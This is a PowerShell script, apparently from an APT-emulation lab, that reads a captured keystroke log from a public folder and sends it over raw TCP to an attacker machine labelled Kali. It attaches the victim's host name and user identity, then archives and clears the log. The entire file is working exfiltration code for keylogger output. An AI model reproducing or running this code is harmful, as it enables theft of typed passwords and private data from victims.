function Invoke-KeyExfil {
    $PublicDir = "C:\Users\Public\apt29"
    mkdir $PublicDir -Force -EA SilentlyContinue
    $LogFile = "$PublicDir\login_handler.log"
    function L($m) { "[$(Get-Date -Format 'HH:mm:ss')] $m" | Out-File $LogFile -Append }

    $KeyLogFile = "$PublicDir\keylog.txt"
    $KaliIP = "192.168.56.100"
    $KaliPort = 5555

    L "LOGIN HANDLER START"

    if (-not (Test-Path $KeyLogFile)) {
        L "[!] keylog.txt khong ton tai. Bo qua."
        return      # ← Bên trong function → an toàn
    }

    $keylog = Get-Content $KeyLogFile -Raw -EA SilentlyContinue
    if ([string]::IsNullOrEmpty($keylog)) {
        L "[!] keylog.txt rong. Bo qua."
        return
    }

    L "[1] Keylog size: $($keylog.Length) chars"

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($KaliIP, $KaliPort)

        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("=== KEYLOG UPLOAD ===")
        $writer.WriteLine("Host: $env:COMPUTERNAME")
        $writer.WriteLine("User: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)")
        $writer.WriteLine("Time: $(Get-Date)")
        $writer.WriteLine("Size: $($keylog.Length) chars")
        $writer.WriteLine("--- BEGIN KEYLOG ---")
        $writer.Write($keylog)
        $writer.WriteLine("")
        $writer.WriteLine("--- END KEYLOG ---")

        $writer.Close()
        $stream.Close()
        $client.Close()

        L "  OK - Da gui"
    } catch {
        L "  FAIL: $_"
    }

    $BackupDir = "$PublicDir\keylog_history"
    mkdir $BackupDir -Force -EA SilentlyContinue
    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
    Copy-Item $KeyLogFile "$BackupDir\keylog_$ts.txt" -Force -EA SilentlyContinue
    Remove-Item $KeyLogFile -Force -EA SilentlyContinue
    L "[3] Da backup + reset keylog"
}

# Gọi function
Invoke-KeyExfil
